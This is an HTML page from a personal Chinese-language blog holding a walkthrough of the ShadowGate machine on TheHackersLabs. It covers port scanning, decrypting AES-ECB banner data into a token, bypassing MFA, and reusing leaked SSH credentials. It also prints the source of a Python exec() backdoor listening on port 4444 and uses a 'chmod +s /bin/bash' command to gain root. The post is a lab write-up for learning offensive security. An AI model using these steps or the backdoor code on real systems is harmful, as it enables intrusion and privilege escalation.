<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/Cn2u-1XBPoyjEdHEI3G0H/_buildManifest.js" defer=""></script><script src="/_next/static/Cn2u-1XBPoyjEdHEI3G0H/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsShadowGate","contentHtml":"\u003ch1\u003eShadowGate\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/97\"\u003ehttps://labs.thehackerslabs.com/machine/97\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ShadowGate nmap -sT -min-rate 10000 -p- 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:20 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.105\nHost is up (0.00050s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n8080/tcp  open  http-proxy\n56789/tcp open  unknown\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 16.41 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ShadowGate nmap -sT -A -p 22,8080,56789 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:21 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.105\nHost is up (0.00047s latency).\n\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)\n|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)\n8080/tcp  open  http       Werkzeug httpd 3.1.3 (Python 3.12.3)\n|_http-title: 403 Forbidden\n|_http-server-header: Werkzeug/3.1.3 Python/3.12.3\n56789/tcp open  tcpwrapped\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.47 ms 192.168.56.105\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 26.07 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e8080\u003c/code\u003e 端口\u003c/p\u003e\n\u003cp\u003e提示错误的方法，但是你找到路径了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/Snipaste_2025-08-05_21-30-52.png\" alt=\"Snipaste_2025-08-05_21-30-52.png\"\u003e\u003c/p\u003e\n\u003cp\u003e改为 \u003ccode\u003ePOST\u003c/code\u003e 方法后提示\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没有任何信息，看一下其他端口\u003c/p\u003e\n\u003cp\u003e奇怪的 \u003ccode\u003e56789\u003c/code\u003e 端口，\u003ccode\u003enc\u003c/code\u003e 试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ShadowGate nc 192.168.56.105 56789                 \nShadow Gate v1.0 :: Not all doors are locked. Some \u003cspan class=\"hljs-built_in\"\u003ewait\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e n0cturne. Listen closely—patterns hide \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the noise. Sequence always matters.\nListening... but no response.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e暗影之门 v1.0 :: 并非所有门都锁着。有些门在等待夜幕降临。仔细聆听——噪音中隐藏着规律。顺序总是很重要。\n聆听……但没有回应。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e看着像是要向里边按顺序输入一下东西\u003c/p\u003e\n\u003ch2\u003e56789\u003c/h2\u003e\n\u003cp\u003e当我们输入 \u003ccode\u003en0cturne\u003c/code\u003e 时，会出现好几串 \u003ccode\u003ebase64\u003c/code\u003e 加密后的字符\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且重新输入生成的还是不一样的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e根据特征，解密后得到 16字节 = 128位。这是现代分组密码（如 \u003ccode\u003eAES-128\u003c/code\u003e）最常见的块大小（Block Size）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 第一次生成\nYzRmN2QzNQ==\nMwaB7TbchXxNQQwID9JXIg==\n7+ptCEtXTcCFo8dVwYrIEw==\nYAgEH6bP+PPY4VyD80z7sg==\na+T5dxugIDfFykgQi71Eag==\nfGMHS36e74T+cALZURlj8g==\nez4fog9UnAeemGETp6K2Aw==\nXZSJq2YIk3v/GM9R/NPa9w==\nsh6KfrTKDXndFadgySlIhA==\n\n// 第二次生成\nYzRmN2QzNQ==\n5/moJpOc9OpfYOHR6jl+bA==\nGWxuKkuzPn0t4aTSO0livQ==\nE2QIRlxnY+gWfTlVUcm4LA==\nYu9ChnO4fJxbMPPGbN04ug==\nNdNO8rDcGcLah47kqmnKBA==\ngFpBAQKKx1QDMNw60GkiwA==\n4eL9754ZX/qQYUk4s6Q9SA==\nMxte5TYR9OIZuzOmQDWAYg==\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e第一行解码为：\u003ccode\u003eYzRmN2QzNQ==\u003c/code\u003e \u003e\u003ccode\u003ec4f7d35\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这里因为我对密码学不熟，查阅了一下 \u003ccode\u003eWP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e第一串编码应该是密钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(more) ➜  ShadowGate \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"hljs-string\"\u003e\"c4f7d35\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003esha256sum\u003c/span\u003e\n7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后在 \u003ccode\u003ecyberchef\u003c/code\u003e 进行解密，因为我们不知道 \u003ccode\u003eIV\u003c/code\u003e 以及加密模式，我们都可以进行测试一下，最后可以使用 \u003ccode\u003eECB/NoPadding\u003c/code\u003e 进行解密\u003c/p\u003e\n\u003cp\u003e解密第一次的密文\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解密第二次的密文\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以发现每一段密文的第一个字符都是一样的，能拿到 \u003ccode\u003ev4u1tgx9\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e8080\u003c/h2\u003e\n\u003cp\u003e拿到 \u003ccode\u003ev4u1tgx9\u003c/code\u003e 之后，我们应该可以对 \u003ccode\u003e8080\u003c/code\u003e 进行测试了\u003c/p\u003e\n\u003cp\u003e输入 \u003ccode\u003eusername\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e令牌已派出。你只需要……侧身看。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e提示缺少 \u003ccode\u003eToken\u003c/code\u003e ，并且还看到相应保中带有 \u003ccode\u003eMFA\u003c/code\u003e（双重认证），是基于时间生成的 \u003ccode\u003eTOTP\u003c/code\u003e 一次性口令，无法直接爆破\u003c/p\u003e\n\u003cp\u003e对目录进行爆破，尝试寻找更多接口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ShadowGate ffuf -u \u003cspan class=\"hljs-string\"\u003e'http://192.168.56.105:8080/FUZZ'\u003c/span\u003e -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e 404,403 -X POST -H \u003cspan class=\"hljs-string\"\u003e'Content-Type: application/x-www-form-urlencoded'\u003c/span\u003e\n\n        /\u003cspan class=\"hljs-string\"\u003e'___\\  /'\u003c/span\u003e___\\           /\u003cspan class=\"hljs-string\"\u003e'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://192.168.56.105:8080/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 404,403\n________________________________________________\n\nlogin                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 72ms]\nverify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 85ms]\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e找到 \u003ccode\u003everify\u003c/code\u003e 的端点，进行测试，所以 \u003ccode\u003elogin\u003c/code\u003e是第一层认证，\u003ccode\u003everify\u003c/code\u003e 是第二层认证\u003c/p\u003e\n\u003cp\u003e将第一层的响应中的 \u003ccode\u003eX-Shadow-MFA: 286346\u003c/code\u003e 放到 \u003ccode\u003everify\u003c/code\u003e中\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e添加后提示：” 承认。主动服务。“\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e回到 \u003ccode\u003e56789\u003c/code\u003e端口，原本的行为会被改变\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到一组凭据 \u003ccode\u003emars:sshpassword123\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e该用户能读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emars@TheHackersLabs-Shadowgate:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nacf9xxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e查看正在监听端口\u003c/p\u003e\n\u003cp\u003e存在一个本地打开 \u003ccode\u003e4444\u003c/code\u003e 端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emars@TheHackersLabs-Shadowgate:~$ ss -tulpn\nNetid          State           Recv-Q          Send-Q                             Local Address:Port                      Peer Address:Port          Process                                    \nudp            UNCONN          0               0                                     127.0.0.54:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                                  127.0.0.53%lo:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                          192.168.56.105%enp0s3:68                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                      127.0.0.1:4444                           0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:2222                           0.0.0.0:*              \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e:((\"socat\",pid=\u003cspan class=\"hljs-number\"\u003e25904\u003c/span\u003e,fd=\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e))          \ntcp            LISTEN          0               4096                               127.0.0.53%lo:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:56789                          0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                  127.0.0.54:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               128                                      0.0.0.0:8080                           0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                           *:22                                   *:* \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003esocat\u003c/code\u003e 转发出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emars@TheHackersLabs-Shadowgate:~$ ./socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:4444 \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行交互\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试了一下有点懵\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003e/opt\u003c/code\u003e 中能找到源码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e shadow-client.py\n\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/env python3\u003c/span\u003e\nimport socket\nimport threading\nimport io\nimport contextlib\n\ndef handle_client(client_socket):\n    client_socket.send(b\u003cspan class=\"hljs-string\"\u003e\"Welcome to Shadow Client Helper\\n\"\u003c/span\u003e)\n    client_socket.send(b\u003cspan class=\"hljs-string\"\u003e\"This is an unrestricted environment. Good luck, hacker.\\n\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e True:\n        client_socket.send(b\u003cspan class=\"hljs-string\"\u003e\"\u003e\u003e\u003e \"\u003c/span\u003e)\n        code = client_socket.recv(1024).decode().strip()\n        try:\n            output = io.StringIO()\n            with contextlib.redirect_stdout(output):\n                \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(code, globals())\n            result = output.getvalue()\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e result.strip():\n                client_socket.send(result.encode())\n        except Exception as e:\n            client_socket.send(f\u003cspan class=\"hljs-string\"\u003e\"Error: {e}\\n\"\u003c/span\u003e.encode())\n\ndef main():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((\"\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e\", \u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e))\n    server.listen(5)\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e True:\n        client, addr = server.accept()\n        client_handler = threading.Thread(target=handle_client, args=(client,))\n        client_handler.start()\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    main()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e简单来说，它创建了一个服务器，任何连接到这个服务器的客户端都可以执行任意的 Python 代码，并获取执行结果。 这本质上是一个远程代码执行（RCE, Remote Code Execution）的后门程序。\u003c/p\u003e\n\u003cp\u003e这就简单了，输入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003e\u003e\u003e import os;\n\u003e\u003e\u003e os.system(\u003cspan class=\"hljs-string\"\u003e\"chmod +s /bin/bash\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e回到靶机上查看\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsShadowGate/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ /bin/bash -p\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e /root\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt\n437axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","updated":"2025-08-06","tags":["TheHackersLabs","linux","MFA","ffuf","python"],"categories":"靶机","comments":true,"description":"ShadowGate\n\n https://labs.thehackerslabs.com/machine/97\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\n `8080` 端口\n\n提示错误的方法，但是你找到路径了\n\n\n\n改为 `POST` 方法后提示\n\n\n\n没有任何信息，看一下其他端口\n\n奇怪的 `56789` 端口，`nc` 试一下\n\n\n\n 暗影之门 v1.0 :: 并非所有门都..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsShadowGate"},"buildId":"Cn2u-1XBPoyjEdHEI3G0H","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>